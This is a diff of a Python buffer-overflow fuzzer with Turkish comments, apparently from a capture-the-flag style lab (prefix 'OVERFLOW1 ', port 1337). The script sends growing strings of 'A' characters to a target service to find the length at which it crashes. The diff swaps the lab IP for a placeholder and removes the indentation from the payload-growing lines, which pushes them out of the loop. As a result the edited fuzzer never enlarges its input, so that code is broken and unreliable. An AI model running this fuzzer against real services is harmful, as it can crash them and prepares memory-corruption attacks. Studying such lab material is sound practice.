@@ -3,7 +3,7 @@ import time
 import socket
 
 # Hedef bilgileri
-ip = "192.168.37.131"  # Hedef IP adresini burada değiştirin
+ip = "IP_ADDRESS"  # Hedef IP adresini burada değiştirin
 port = 1337            # Hedef port numarasını burada değiştirin
 timeout = 5            # Bağlantı zaman aşımı süresi (saniye)
 prefix = "OVERFLOW1 "  # Hedef uygulama için uygun prefix'i burada değiştirin
@@ -39,7 +39,7 @@ while True:
         print(f"Fuzzing işlemi {len(string) - len(prefix)} baytta çöktü.")
         sys.exit(0)
     
-    # String uzunluğunu artır
-    payload_boyutu += 100  # Bayt boyutunu artır
-    string = prefix + "A" * payload_boyutu  # Yeni string oluştur
-    time.sleep(1)  # Bir sonraki denemeden önce 1 saniye bekle
+# String uzunluğunu artır
+payload_boyutu += 100  # Bayt boyutunu artır
+string = prefix + "A" * payload_boyutu  # Yeni string oluştur
+time.sleep(1)  # Bir sonraki denemeden önce 1 saniye bekle
